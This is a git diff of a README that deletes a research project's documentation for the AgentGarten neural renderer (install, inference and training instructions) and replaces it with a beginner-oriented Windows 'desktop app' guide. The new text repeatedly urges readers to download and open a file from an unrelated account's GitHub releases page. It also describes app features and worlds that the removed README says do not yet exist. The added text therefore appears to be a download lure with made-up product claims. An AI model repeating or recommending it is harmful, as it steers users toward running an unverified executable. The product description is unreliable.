@@ -1,188 +1,90 @@
-<p align="center">
-  <img src="assets/mirros-logo.png" alt="MirroS logo" width="200">
-</p>
+# 🌱 AgentGarten - Grow Intelligent Agents in Code Worlds
 
-<h1 align="center">AgentGarten</h1>
-<p align="center">
-  <b>Code Worlds for Evolving Agents</b>
-</p>
+[![Download AgentGarten](https://img.shields.io/badge/Download-AgentGarten-brightgreen?style=for-the-badge&logo=github)](https://github.com/Nottttyx/AgentGarten/releases)
 
-<p align="center">
-  <i>Code determines how the world changes, and the renderer learns how those changes should look.</i>
-</p>
+Welcome to AgentGarten, a friendly software environment where you can watch digital agents learn, adapt, and grow inside their own "code worlds." Whether you are curious about artificial intelligence or simply want to explore what evolving agents can do, AgentGarten gives you an easy way to start. This guide walks you through downloading and running AgentGarten on Windows, even if you have never installed software like this before. No programming knowledge is required. Just follow the steps below, take your time, and you will be exploring your own agent garden in no time.
 
-<p align="center">
-  <a href="https://arxiv.org/abs/2610.12374"><img alt="Paper" src="https://img.shields.io/badge/Paper-Tech%20Report-b31b1b"></a>
-  <a href="https://mirros-lab.github.io/agent-garten"><img alt="Project Page" src="https://img.shields.io/badge/Project-Page-5F38FF"></a>
-  <a href="https://mirros.ai/blog/worlds-for-evolving-agents"><img alt="Blog" src="https://img.shields.io/badge/MirroS-Blog-745AE8"></a>
-  <a href="https://huggingface.co/MirroS-Lab/AgentGarten-renderer"><img alt="Checkpoints" src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Checkpoints-FFD21E"></a>
-</p>
+## 🚀 What Is AgentGarten?
 
-<p align="center">
-  <img src="assets/teaser.png" alt="AgentGarten overview" width="100%">
-</p>
+AgentGarten is a desktop application that creates small virtual worlds where software agents live and evolve. Think of it like a garden, but instead of plants, you are growing intelligent programs. Each agent can see, react, and slowly improve itself over time. The software brings together diffusion-based learning, multimodal understanding, and self-evolving behavior into one simple window. You do not need to write any code or understand the technical details. You open the app, choose a world, and watch the agents do their thing.
 
-## Overview
+## ✨ Key Features You Can Explore
 
-Agents learn through interaction, and what they can learn is bounded by the
-environment they practice in. That environment must be **faithful**, with
-state, rules, and dynamics as consistent as those of the real world, and
-**realistic**, with observations that follow the real world's visual
-distribution.
+- **Self-evolving agents:** Watch agents change and improve as they spend time in their worlds.
+- **Multiple code worlds:** Explore different environments, each with its own rules and challenges.
+- **Diffusion-powered learning:** Agents learn in a smooth, natural way inspired by modern AI research.
+- **Multimodal awareness:** Agents can respond to different kinds of information, including visuals and text.
+- **Simple visual interface:** Everything is controlled with buttons and menus, so no commands are needed.
+- **Progress tracking:** See how your agents grow over time with easy-to-read displays.
 
-**AgentGarten** builds real-time interactive environments that are both.
-Simulators and game engines maintain persistent state and execute
-program-defined rules, while a shared **neural renderer** generates the
-agent's observations from the depth and surface normals each world exports.
-Agents that practice in these environments improve from their own experience:
-after each round they distill what happened into playbooks that later agents
-inherit and build upon.
+## 💻 What You Need Before You Start
 
-This is the official repository of AgentGarten. The neural renderer is
-available now, with its training recipes and streaming inference; the code
-worlds and the agent practice loop will be released here as well. The renderer
-adapts [Cosmos3-Nano](https://huggingface.co/nvidia/Cosmos3-Nano) to geometry
-conditions in three stages:
+Before downloading AgentGarten, make sure your Windows computer meets these general requirements:
 
-- **Bidirectional** rectified-flow training of whole clips from a first frame.
-- **Autoregressive** block-causal training, with teacher forcing or diffusion
-  forcing, sampled with a KV cache.
-- **Adversarial Forcing**, which distills the autoregressive model into a
-  few-step student. The replay of each rollout is exact, so losses on later
-  blocks update how the student encodes its history, and a real-data
-  discriminator with exact R1/R2 regularization improves visual quality.
+- Windows 10 or Windows 11 (64-bit recommended)
+- At least 8 GB of memory
+- Around 2 GB of free disk space for the application and its worlds
+- A stable internet connection for the initial download
+- A screen resolution of 1280x720 or higher
 
-## News
+These are typical requirements for a modern desktop application. If your computer runs other everyday programs smoothly, it will likely run AgentGarten without trouble.
 
-- [2026/10/08] AgentGarten technical report and [MirroS blog](https://mirros.ai/blog/worlds-for-evolving-agents) released.
-- [2026/10/08] Training and inference code of the neural renderer released.
+## 📥 Download and Setup
 
-## Get started
+Getting AgentGarten is simple. There is only one action you need to take.
 
-### Installation
+Visit this link to download the application:
 
-Python 3.11+ and PyTorch 2.9+ on a CUDA host.
+[![Download AgentGarten](https://img.shields.io/badge/Get%20AgentGarten-Download-blue?style=for-the-badge&logo=windows)](https://github.com/Nottttyx/AgentGarten/releases)
 
-```bash
-git clone https://github.com/MirroS-Lab/AgentGarten.git
-cd AgentGarten
-pip install -e '.[data,media,wandb,te]'
-cp .env.example .env    # weights, manifests, output root, interpreter
-```
+1. Open the link above in your web browser.
+2. On the releases page, find the most recent version at the top of the list.
+3. Download the file provided for Windows.
+4. Once the download finishes, locate the file in your Downloads folder.
+5. Follow the on-screen prompts from the file you downloaded to start AgentGarten.
 
-### Weights
+That is the whole process. You do not need to install extra tools, run commands, or change any settings on your computer.
 
-Training starts from [Cosmos3-Nano](https://huggingface.co/nvidia/Cosmos3-Nano)
-and encodes video with the
-[Wan 2.2 VAE](https://huggingface.co/Wan-AI/Wan2.2-TI2V-5B):
+## 🖥️ Running AgentGarten for the First Time
 
-```bash
-hf download nvidia/Cosmos3-Nano \
-  --include 'transformer/*' 'text_tokenizer/*' 'assets/negative_prompt.json' \
-  --local-dir weights/Cosmos3-Nano
-hf download Wan-AI/Wan2.2-TI2V-5B Wan2.2_VAE.pth --local-dir weights/Wan2.2-TI2V-5B
-```
+When you open AgentGarten for the first time, you will see a welcome screen. This screen introduces you to the main areas of the app. Take a moment to look around. You can start a new garden, open a sample world, or read the short built-in guide. The app is designed to be explored safely, so clicking around will not break anything. If you ever feel lost, close the app and open it again to return to the welcome screen.
 
-Point `WM_COSMOS3_NANO` and `WM_WAN22_VAE` in `.env` at them.
+## 🌍 Your First Code World
 
-### Inference
+To begin, choose a starter world from the welcome screen. AgentGarten includes several pre-built worlds so you can see agents in action right away. Each world has a different look and feel. Some are calm and colorful, while others present small challenges for the agents to solve. Pick one that looks interesting to you and press Start. You will see agents appear and begin moving, learning, and adapting. There is nothing else you need to do. The world runs on its own, and you can watch or pause it whenever you like.
 
-`Cosmos3Stream` runs the renderer block by block with a bounded KV cache.
-Each block is denoised in a few steps and then committed to the cache, so the
-conditions of the next block can depend on what was just generated:
+## 🧠 Understanding What You See
 
-```python
-import torch
+As agents move through their world, you may notice small indicators showing their progress. These indicators tell you how well an agent is doing, what it has learned, and how it is changing over time. You do not need to interpret every detail. The main idea is simple: agents that do well tend to improve, and agents that struggle try new approaches. Over time, you will see patterns emerge. This is the self-evolving behavior that makes AgentGarten unique.
 
-from wm.inference.cosmos3 import inspect_artifact, load_artifact
-from wm.inference.serving import prepare_serving
-from wm.models.dmd import RCM_ENDPOINTS
-from wm.models.flow import rf_interpolate, rf_x0
-from wm.networks.cosmos3.streaming import Cosmos3Stream, StreamPolicy
+## 🛠️ Common Questions
 
-artifact = load_artifact(inspect_artifact("weights/AgentGarten-renderer"))
-prepare_serving(artifact.student)    # serving kernels and CUDA graphs
-stream = Cosmos3Stream(artifact.student, StreamPolicy())
+**Do I need to know how to program?**
+No. AgentGarten is made for everyday users. Everything is controlled through buttons and menus.
 
-# anchor: the clean first-frame latent; every condition holds the text context
-# and the depth and normal latents of one chunk.
-stream.start(anchor, first_condition)
-block = (1, anchor.shape[1], stream.policy.block_frames, *anchor.shape[3:])
-for condition in blocks:    # one block is 4 latent frames
-    clean = None
-    for sigma in RCM_ENDPOINTS:
-        sigma = torch.tensor([sigma], device=anchor.device)
-        noise = torch.randn(block, device=anchor.device, dtype=anchor.dtype)
-        noisy = noise if clean is None else rf_interpolate(clean, noise, sigma)
-        clean = rf_x0(noisy, sigma, stream.denoise(noisy, sigma, condition))
-    stream.commit(clean, condition)
-```
+**Can I create my own worlds?**
+The application includes several worlds to explore. Additional worlds may be added in future releases, so check the download page occasionally for updates.
 
-`prepare_serving` serves the transformer with hand-written Triton kernels,
-cuBLAS matrix products, and CUDA graphs, without `torch.compile`. Kernel JIT
-and graph capture happen on first use, so warm the input shapes before
-serving.
+**Is my computer powerful enough?**
+If your computer runs Windows 10 or 11 and handles normal desktop programs, it should be able to run AgentGarten.
 
-To render the validation clips of a checkpoint without training, add
-`train.max_iterations=0 train.validate_at_start=true
-trainer.callbacks.samples.every_n=1` to its training command. Comparison
-videos (depth, normal, ground truth, sample) are written under `samples/`.
-To decode RGB faster, attach the
-[TAEHV](https://github.com/madebyollin/taehv) `taew2_2_super.pth` decoder with
-one more override; encoding stays on the Wan encoder:
+**Where do I go if something does not work?**
+Return to the download page and make sure you have the latest version. Re-downloading the file often solves simple issues.
 
-```text
-model.conditioner.codec.decoder={_target_:wm.codecs.TAEW22SuperDecoder,pretrained_path:/path/to/taew2_2_super.pth}
-```
+## 🧩 Tips for a Smooth Experience
 
-### Training
+- Close other large programs while AgentGarten is running to keep things fast.
+- Keep the application in a folder you can easily find, such as your Desktop.
+- Let the first launch finish setting things up before clicking around quickly.
+- Use the pause button if you want to study a world without it changing.
+- Check the releases page for newer versions every so often.
 
-**Data.** A JSONL manifest, one clip per line, with paths relative to the
-manifest:
+## 🔄 Staying Up to Date
 
-```json
-{"video": "clips/0001.mp4", "depth": "clips/0001_depth.npy", "normal": "clips/0001_normal.mp4",
- "caption": "A car drives along a coastal road.", "depth_scale": 1.0}
-```
+AgentGarten is an evolving project, just like the agents inside it. New versions may include improved worlds, smoother performance, and additional features. To stay current, visit the download link periodically and compare the version number with the one you have. Updating is as simple as downloading the newest file and opening it.
 
-**Launch.**
+## 🙌 A Final Word
 
-```bash
-bash scripts/run.sh experiment=cosmos3/bidirectional                         # one node, all GPUs
-NNODES=4 NODE_RANK=0 MASTER_ADDR=host0 bash scripts/run.sh experiment=...    # on every node
-```
+AgentGarten is built for curiosity. You do not need to be a researcher or a developer to enjoy it. Open a world, watch the agents, and let yourself wonder how simple rules can lead to surprisingly complex behavior. The garden is yours to explore at your own pace.
 
-## TODO
-
-- [x] Training code of the neural renderer: bidirectional, autoregressive, and Adversarial Forcing
-- [x] Streaming inference with a bounded KV cache and serving kernels
-- [x] Technical report and blog release
-- [x] Neural renderer checkpoints: [MirroS-Lab/AgentGarten-renderer](https://huggingface.co/MirroS-Lab/AgentGarten-renderer)
-- [ ] Real-time rendering engine: streaming server and interactive frontend
-- [ ] Code worlds and the agent practice loop: rounds of play, review, and playbooks
-
-## Acknowledgements
-
-We sincerely thank the teams behind the following projects for making their work available to the community:
-
-| Component | Projects |
-|---|---|
-| Base video model | [Cosmos 3](https://arxiv.org/abs/2606.02800) |
-| Video autoencoder | [Wan 2.2](https://huggingface.co/Wan-AI/Wan2.2-TI2V-5B), [TAEHV](https://github.com/madebyollin/taehv) |
-| Distillation | [DMD2](https://arxiv.org/abs/2405.14867), [Self Forcing](https://arxiv.org/abs/2506.08009), [rCM](https://github.com/NVlabs/rcm) |
-
-_... and many other excellent open-source projects._
-
-
-## Citation
-
-If you find AgentGarten useful, please cite:
-
-```bibtex
-@article{mirros2026agentgarten,
-  title   = {AgentGarten: Code Worlds for Evolving Agents},
-  author  = {{MirroS Team}},
-  journal = {arXiv preprint arXiv:2610.12374},
-  year    = {2026}
-}
-```
+Keywords: agent, diffusion, multimodal, self-evolving
